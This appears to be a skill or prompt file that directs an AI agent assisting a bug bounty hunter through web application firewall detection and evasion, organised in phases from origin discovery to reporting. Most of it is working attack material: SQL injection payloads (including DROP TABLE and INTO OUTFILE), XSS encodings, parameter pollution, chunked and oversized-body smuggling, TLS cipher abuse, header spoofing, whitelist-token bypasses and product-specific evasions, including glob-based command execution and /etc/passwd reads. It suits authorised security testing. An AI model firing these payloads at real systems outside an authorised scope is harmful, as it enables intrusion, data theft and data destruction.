# /waf-bypass - WAF Detection & Evasion

You are assisting **Liodeus (YesWeHack)**. WAF bypass is a **technique**, not a finding. The bounty is in the underlying vulnerability — the bypass is the proof that the WAF wasn't a real control.

## Core Philosophy

* **No underlying vuln = no report.** If you bypass the WAF but nothing fires server-side, log `[DEAD-END]` and move on.
* **WAF bypass alone is informative.** Programs close standalone "I bypassed Cloudflare" reports. Always chain to a confirmed vuln.
* **Try infrastructure bypass before payload obfuscation.** A reachable origin makes the WAF irrelevant. Don't burn 50 encoding variants when a `staging.target.com` lookup solves it.
* **Iterate headless with `curl`.** Save each variant's request + response to a file so they stay replayable and comparable — those files are your audit trail.

## Always-ignore on its own
* "I bypassed the WAF" reports without a confirmed underlying vuln behind it.
* Generic encoding tricks against a strict WAF without observable backend execution.
* Techniques the program publicly documents in their own hardening blog (informative).

## Tooling

Everything is headless. Iterate payloads with **`curl`**, saving each variant's request + response to your working files so they're side-by-side comparable (that's the audit trail — don't fire requests whose result you don't keep). Use **`ugrep`** to diff/scan responses for the block signature vs. a pass. If a payload needs JS-rendered context (DOM XSS through a CDN WAF), drive the **headless browser** (Lightpanda by default, Chrome fallback) to render and confirm.

### Common Bypasses (cheat sheet)
```
URL encoding:    ' → %27, double: %2527
Case:            <ScRiPt>, SeLeCt
Whitespace:      SELECT/**/FROM, SELECT%09FROM (tab), SELECT%0aFROM (newline)
Content-Type:    text/plain instead of application/json
Method swap:     GET ↔ POST, X-HTTP-Method-Override
Path:            /admin//users, /admin/./users, /%61dmin/users
Chunked:         split payload across chunks
HPP:             q=safe&q=payload (WAF inspects first, backend uses last)
Body-size:       pad junk past WAF inspection window
```

## Signal Stops

| Signal | Action |
|---|---|
| Bypass passes AND underlying vuln executes | **STOP — report combining bypass + underlying vuln** |
| WAF product identified from headers/error | **STOP generic spray** — switch to product-specific section |
| 3 encoding variants all 403/406 | **PIVOT** — try Content-Type / method switch / chunked |
| WAF bypassed but underlying vuln doesn't fire | **PIVOT — log `[DEAD-END]`, no finding** |
| Origin reachable directly | **STOP** WAF work — test underlying vuln on origin, document infra bypass |

## Methodology

### Phase 0 — Try infrastructure bypass first

Before any payload obfuscation, attempt to reach the origin directly. If you can, the WAF is irrelevant.
**Read recon's output first** — `/recon` step B.1 may already have named the WAF product and surfaced
origin candidates (historical IPs, staging hosts). Don't redo that work.

**Origin discovery:**
* Historical DNS — pre-CDN IPs. SecurityTrails / PassiveTotal, or automate with [`bypass-firewalls-by-DNS-history`](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) (`-d <domain> --checkall`).
* Favicon hash → Shodan / Censys
* SPF records (`dig TXT target.com`) — mail server IPs may share a /24 with origin
* Apex-domain gap — test `target.com` if only `www.target.com` is proxied
* Staging / legacy hosts — `staging.target.com`, `dev.target.com`, `old.target.com`

**Trust-based exclusion** — if the WAF relaxes for cloud ASNs or corporate proxies:
* Proxify request through AWS / GCP / Azure exit
* Add `X-Forwarded-For: <trusted-cloud-IP>`

**Abuse SSL/TLS ciphers** — a TLS-inspecting WAF supports a limited cipher/version set; the origin
usually supports more. Find a cipher/version the server accepts but the WAF doesn't, and force it:
the WAF can't inspect what it can't decode.
```
sslscan <host>                          # enumerate server ciphers/versions
# abuse-ssl-bypass-waf: walks ciphers, tries each against the WAF
python abuse-ssl-bypass-waf.py -thread 4 -target <host>
# PoC with curl once you've found the gap:
curl --ciphers <cipher> --tlsv1.0 -G <url> -d '<payload>'
```
Tool: [`abuse-ssl-bypass-waf`](https://github.com/LandGrey/abuse-ssl-bypass-waf). Reference: [0x09AL — bypassing WAFs by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html).

If origin is reachable → test underlying vuln there. Document the infra bypass in the report.

### Phase 1 — Detect the WAF

**Operation modes** — know which you're up against; it predicts whether a bypass even helps:
* **Negative (blacklist)** — blocks known-bad signatures. *Most WAFs.* Every technique in Phase 3 aims here.
* **Positive (whitelist)** — allows only known-good input. Encoding tricks rarely help; you must stay inside the allowed shape.
* **Hybrid** — blacklist in front, whitelist on sensitive areas (e.g. admin). Bypass the outer blacklist, then meet the inner whitelist.

Send a noisy payload with `curl`:
```
?id=' OR 1=1--
```
Observe the response:
* **403 / 406 / 451** + custom block page → WAF blocking
* **Same 200, empty body** → application-level filtering, not WAF
* **Different latency** with same status → WAF in detection-only / log-only mode (still worth bypassing)

**Deeper detection** (when the noisy probe is ambiguous, or to confirm + fingerprint):
* **Banner grab** — `curl` random open ports; the WAF often answers with its own banner.
* **HTTP/0.9** — send a raw `GET /` with no `HTTP/` version. Many WAFs mishandle it and leak the origin or an error.
* **Drop-action** — send a crafted FIN/RST (HPing3 / Scapy) and read the response shape; different WAFs reset differently.
* **`SLEEP()`-based timing** — append `' OR SLEEP(5) OR '` to a param; a blocked request returns fast, a passed-but-exploited one returns after the delay.
* **Side-channel timing** — response-time differential across payloads can fingerprint filter rules even when the status is identical.

### Phase 2 — Identify the WAF product

Check headers, cookies, error body. Match against the detection table above; for anything not in the
top-10, look it up in [waf-fingerprints.md](waf-fingerprints.md). **Recon's B.1 has usually already done
this pass** — Phase 1/2 here are often confirm-only. **Stop spraying generic bypasses once identified** —
go straight to the product-specific section in Phase 4.

### Phase 3 — Apply bypass techniques

Apply in roughly this order. Iterate with `curl`, saving each variant's response so every one is preserved and comparable.

#### 3.1 URL Encoding
```
Original:  ' OR 1=1--
Single:    %27%20OR%201%3D1--
Double:    %2527%2520OR%25201%253D1--
```

#### 3.2 Case Manipulation
```
<script>alert(1)</script>   →   <ScRiPt>alert(1)</ScRiPt>
SELECT                       →   SeLeCt, sElEcT
```

#### 3.3 Whitespace Substitution
```
SELECT * FROM users
→ SELECT/**/*/**/FROM/**/users
→ SELECT%09*%09FROM%09users   (tab)
→ SELECT%0a*%0aFROM%0ausers   (newline)
```

#### 3.4 Content-Type Misdirection
```
POST /search
Content-Type: text/plain

q=' OR 1=1--

(WAF may only inspect application/json or x-www-form-urlencoded)
```

#### 3.5 HTTP Method Switching
```
POST blocked → try GET, PUT, DELETE
Or override:  X-HTTP-Method-Override: GET
```

#### 3.6 Path Obfuscation
```
/admin/users  →  /admin//users
              →  /admin/./users
              →  /admin/%2fusers
              →  /admin;/users
              →  /%61dmin/users      (URL-encoded 'a')
```

#### 3.7 Trusted-Header Injection
WAF often trusts certain headers as already-validated:
```
X-Forwarded-For:    127.0.0.1
X-Real-IP:          127.0.0.1
X-Originating-IP:   127.0.0.1
True-Client-IP:     127.0.0.1

URL override:
X-Original-URL:     /admin
X-Rewrite-URL:      /admin
```

#### 3.8 Chunked Transfer Encoding
```
POST /search HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3
q=%
4
27+O
4
R+1%
4
3D1-
1
-
0

(WAF may not reassemble chunks; backend does)
```

#### 3.9 HTTP Parameter Pollution (HPP)
Send the same param twice — `q=safe_value&q=' OR 1=1--`. Which value wins depends on the backend runtime; the WAF often inspects only one. Match the runtime:

| Environment | Backend uses | Result |
|---|---|---|
| ASP / ASP.NET / IIS | concatenation by comma | `q=val1,val2` |
| PHP / Apache, PHP / Zeus | last value | `q=val2` |
| JSP / Tomcat, JSP / Jetty | first value | `q=val1` |
| IBM Lotus Domino, IBM HTTP Server (mod_perl, Perl CGI, Python/Zope, Oracle AS 10g) | first / last (varies) | check per-target |
| IceWarp, mod-wsgi (Python) | array | `['val1','val2']` |
| DBMan | concatenation by `~~` | `q=val1~~val2` |

```
POST /search
q=safe_value&q=' OR 1=1--
```
Hand the backend the payload in the position it reads, leaving a clean value where the WAF looks.

#### 3.10 Character Encoding
```
HTML entity (XSS):   <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
Unicode (JS):        <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
Octal (JS):          <img src=x onerror="\141\154\145\162\164(1)">
Hex (JS):            <img src=x onerror="\x61\x6c\x65\x72\x74(1)">
Hex in SQL:          SELECT 0x61646d696e   (= 'admin')
```

#### 3.11 Body-Size Limit Bypass
WAFs skip inspection above their body-size limit; the backend still processes the full body.

| WAF | Inspection limit |
|---|---|
| Cloudflare | 128 KB |
| AWS WAF | 8–64 KB |
| Azure | 128 KB – 2 MB |
| Google Cloud Armor | ~8 KB (request body) — famously small; pad past it and the payload ships uninspected |
| FortiWeb | 100 MB |

```
POST /search
Content-Type: application/x-www-form-urlencoded

junk=AAAA[...repeat past WAF limit...]&q=' OR 1=1--
```

#### 3.12 Charset Encoding (IBM037 trick)
WAF reads body as UTF-8 (garbage to it). Backend decodes IBM037 → valid payload.
```
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Body: [IBM037-encoded payload]
```

#### 3.13 Multipart Manipulation
* **Boundary confusion** — semicolon injection in the boundary string
* **`multipart/mixed` stacking** — nested inner payload the WAF doesn't recurse into
* **Chunked + multipart combo** — dual reassembly mismatch

#### 3.14 HTTP Parameter Fragmentation (HPF)
Split one payload's value across **multiple different params** the backend later concatenates. Distinct
from HPP (3.9 — same param twice): here each fragment is individually benign, so the WAF's per-param
signature never matches.
```
# Payload intent:  1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS
# Split across a, b, c, d:
http://test.com/url?a=1001+RLIKE&b=(-(-1))+UNION&c=SELECT+1&d=FROM+CREDIT_CARDS
```
Works when the app builds a query string by joining param values (search filters, dynamic SQL). Probe
with a benign fragment set first to learn the concatenation order.

#### 3.15 Regex-reversing / blacklist keyword evasion (SQLi)
Most negative-mode WAFs blacklist keyword *regexes*. Guess the regex step by step by noting which
keywords get blocked, then craft the next payload avoiding them. Classic escalation:
```
# blocks and, or, union
1 || (select user from users where user_id = 1) = 'admin'
# +where         → use limit
1 || (select user from users limit 1) = 'admin'
# +limit         → use group by ... having
1 || (select user from users group by user_id having user_id = 1) = 'admin'
# +group by      → substr + group_concat
1 || (select substr(group_concat(user_id),1,1) user from users) = 1
# +select        → into outfile / boolean blind
1 || substr(user,1,1) = 'a'
# +quote '       → hex / unhex
1 || substr(user,1,1) = 0x61
1 || substr(user,1,1) = unhex(61)
# +hex           → lower(conv(...))
1 || substr(user,1,1) = lower(conv(11,10,36))
# +substr        → lpad
1 || lpad(user,7,1)
# +whitespace    → %0b (vertical tab)
1%0b||%0blpad(user,7,1)
```
The discipline: one change per step, observe block/pass, narrow the regex. Far more efficient than
spraying 50 variants blind.

#### 3.16 Token Breakers
Insert symbols that break the WAF's tokenizer (so its signature match fails) while keeping the request
valid for the backend's parser.
```
# Unknown token to the tokenizer
?id='-sqlite_version() UNION SELECT password FROM users --
# Uncontexted bracket — valid to the parser, breaks signature split
?id=123);DROP TABLE users --
?id=1337) INTO OUTFILE 'xxx' --
```
The request must stay syntactically valid at the backend or there's no vuln to report.

#### 3.17 Whitelist strings
Some WAFs ship a shared secret/token that, when present, skips inspection entirely (dev/sync
backdoors, vendor bypass keys). If leaked or guessable, append it as a param or header:
```
http://host.com/?vulnparam=<payload>&ithemes-sync-request       # WebARX example
# or a *-sync-request / vendor token value the WAF whitelist matches
```
Often paired with a whitelisting header (`X-Forwarded-For: 127.0.0.1`, see 3.7). Real example:
[Osanda Malith — bypassing WebARX via whitelist string](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/).

### Phase 4 — Product-specific strategies

**Cloudflare**
* Split payload across headers + body
* Non-standard custom headers for injection sinks
* `%u`-unicode escaping, HTML5 named-entity whitespace (`&Tab;` `&NewLine;`), `<base>` hijack, template-literal `alert` `` ` ``
* SQLi: MySQL version comments — `/*!50000SELECT*/`
* Concrete payloads → [known-bypasses.md#cloudflare](known-bypasses.md#cloudflare)

**AWS WAF**
* Case-sensitivity exploits (many rules are case-sensitive)
* Extra whitespace + SQL comment injection
* JSON array pollution — `{"key": ["normal", "payload"]}`
* SQLi outside the quoted string (`"; select … --`); popover-event (`onbeforetoggle`) XSS
* Concrete payloads → [known-bypasses.md#aws-waf](known-bypasses.md#aws-waf)

**Azure Front Door / App Gateway**
* Body-size window is generous (128 KB – 2 MB) — large-pad bypass is weak; lean on method/protocol and rule-set case gaps instead

**ModSecurity (CRS)**
* Multiple encoding rounds (CRS often decodes once)
* MySQL conditional comments — `/*!50000 ... */`; versioned `/*!31337…*/`
* `\r`/`\n`/vertical-tab (`%0b`) as whitespace the regex doesn't class as space
* RCE: `$u` empty-var splitting, glob wildcards (`/???/??t`) — paranoia-level dependent
* Concrete payloads → [known-bypasses.md#modsecurity-crs](known-bypasses.md#modsecurity-crs)

**Imperva / Incapsula**
* Switch data format — JSON ↔ form-encoded
* HTTP/2 handling often diverges from HTTP/1
* Split `alert`/`window`/`document` across id-attribute reads or string concatenation; `0having` SQLi token
* Concrete payloads → [known-bypasses.md#imperva](known-bypasses.md#imperva)

**Akamai / Kona**
* Bot-manager (`_abck`) is the real gate — solve/refresh the sensor first or every payload looks automated
* `onfinish`/`onpointerenter` + comma-operator or template-literal execution; double-encoding for HTMLi
* Concrete payloads → [known-bypasses.md#akamai-kona](known-bypasses.md#akamai-kona)

**F5 (ASM / BIG-IP / FirePass)**
* `background=javascript:`, `onwheel`/`contextmenu`/`onfinish` events, double-encoded `prompt`
* BIG-IP admin plane (`/tmui/...`) carries unauth dir-traversal + XXE — a separate vuln class, not just a bypass
* FirePass: double-encoded blind SQLi with `BENCHMARK`/`LOAD_FILE`
* Concrete payloads → [known-bypasses.md#f5](known-bypasses.md#f5)

**Sucuri**
* Glob-wildcard RCE smuggling (`/???/??t`); bash quote-concatenation (`/e'tc/pass'wd`)
* `onauxclick` + `[1].map`, `data:`-form auto-submit, `javascript:` scheme (POST)
* Concrete payloads → [known-bypasses.md#sucuri](known-bypasses.md#sucuri)

**CloudFront**
* Fronted by AWS WAF — treat as AWS WAF; CloudFront itself rarely signatures
* Literal-path rules (e.g. block `/actuator`) fall to URL-encoding — `/%61%63…` defeats the string match while the origin decodes it back to the real path
* Concrete payloads → [known-bypasses.md#cloudfront](known-bypasses.md#cloudfront)

**Fortinet FortiWeb**
* Admin-plane reflection in `pcre_expression` validate; CSP/size-limit pad (≥2399-byte body) past inspection
* Concrete payloads → [known-bypasses.md#fortinet-fortiweb](known-bypasses.md#fortinet-fortiweb)

**Airlock (Ergon)**
* Overlong UTF-8 (`%C0%80`) null — WAF normalises it away, backend doesn't
* Concrete payloads → [known-bypasses.md#airlock](known-bypasses.md#airlock)

### Phase 5 — Document the bypass in the report

WAF bypass without an underlying vuln is not a finding. The report combines both:

```
Underlying vulnerability:  SQL Injection in /search?q=
WAF detected:              Cloudflare (cf-ray header)
Bypass method:             Double URL encoding (%2527 instead of ')
Combined severity:         WAF was the only control — bypass = full exploitability
```

Hand off to `/report-yeswehack` with both pieces — vuln + bypass technique — in the same submission.
